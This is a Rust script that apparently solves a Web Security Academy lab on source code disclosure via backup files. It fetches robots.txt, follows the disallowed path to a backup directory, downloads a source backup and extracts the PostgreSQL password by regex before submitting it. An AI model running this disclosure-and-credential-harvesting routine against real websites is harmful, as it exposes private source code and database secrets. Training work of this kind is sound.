/**************************************************************
*
* Author: Ahmed Elqalawy (@elqal3awii)
*
* Date: 3/9/2023
*
* Lab: Source code disclosure via backup files
*
* Steps: 1. Fetch /robots.txt file
*        2. List the hidden directory
*        3. Fetch the hidden backup file
*        4. Extract the key
*        5. Submit solution
*
***************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use std::{collections::HashMap, time::Duration};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0adf007f03dd1eb884b46ae100220011.web-security-academy.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    println!(
        "{} {}",
        "1. Fetching the robots.txt file..".white(),
        "OK".green()
    );

    // check /robots.txt file
    let get_robots = client.get(format!("{url}/robots.txt")).send();

    // if response is OK
    if let Ok(res) = get_robots {
        // get the body of the response
        let body = res.text().unwrap();

        // extract the hidden name
        let hidden = capture_pattern("Disallow: (.*)", &body);

        // if the href is found
        if let Some(text) = hidden {
            println!(
                "{} {} => {}",
                "2. Searching for hidden files..".white(),
                "OK".green(),
                text.yellow()
            );

            // fetch the backup directory
            let backup = client.get(format!("{url}{text}")).send();

            // if fetching is OK
            if let Ok(res) = backup {
                println!(
                    "{} {}",
                    "3. Fetching the backup directory..".white(),
                    "OK".green()
                );

                // get the body of the backup directory
                let body = res.text().unwrap();

                // extract path to the backup file
                let backup_file = capture_pattern("href='(.*)'>", &body);

                // if the backup file is found
                if let Some(text) = backup_file {
                    println!(
                        "{} {} => {}",
                        "4. Extracting the path to the backup file..".white(),
                        "OK".green(),
                        text.yellow()
                    );

                    // fetch the backup file
                    let get_backup = client.get(format!("{url}{text}")).send();

                    // if response is OK
                    if let Ok(res) = get_backup {
                        println!(
                            "{} {}",
                            "5. Fetching the backup file..".white(),
                            "OK".green()
                        );

                        // get the body of the response
                        let body = res.text().unwrap();

                        // try to extract the key
                        let key_pattern =
                            capture_pattern(r#"\"postgres\",\s*\"postgres\",\s*\"(.*)\""#, &body);

                        // if the key is found
                        if let Some(text) = key_pattern {
                            println!(
                                "{} {} => {}",
                                "6. Extracting key ..".white(),
                                "OK".green(),
                                text.yellow()
                            );

                            // submit solution
                            let submit_answer = client
                                .post(format!("{url}/submitSolution"))
                                .form(&HashMap::from([("answer", text)]))
                                .send();

                            // if submitting is successful
                            if let Ok(res) = submit_answer {
                                println!("{} {}", "7. Submitting solution..".white(), "OK".green());
                                println!(
                                    "{} {}",
                                    "🗹 Check your browser, it should be marked now as"
                                        .white()
                                        .bold(),
                                    "solved".green().bold()
                                )
                            } else {
                                println!("{}", "[!] Failed to submit solution".red())
                            }
                        } else {
                            println!("{}", "[!] Failed to find any keys".red())
                        }
                    } else {
                        println!("{}", "[!] Failed to fetch backup file".red())
                    }
                } else {
                    println!("{}", "[!] Failed to extract the backup file".red())
                }
            } else {
                println!("{}", "[!] Failed to list the hidden directory".red())
            }
        } else {
            println!("{}", "[!] Failed to extract the hidden directory".red())
        }
    } else {
        println!("{}", "[!] Failed to fetch /robots.txt file".red())
    }
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/********************************************
* Function to capture a pattern form a text
*********************************************/
fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap().captures(text);
    if pattern.is_some() {
        Some(pattern.unwrap().get(1).unwrap().as_str().to_string())
    } else {
        None
    }
}
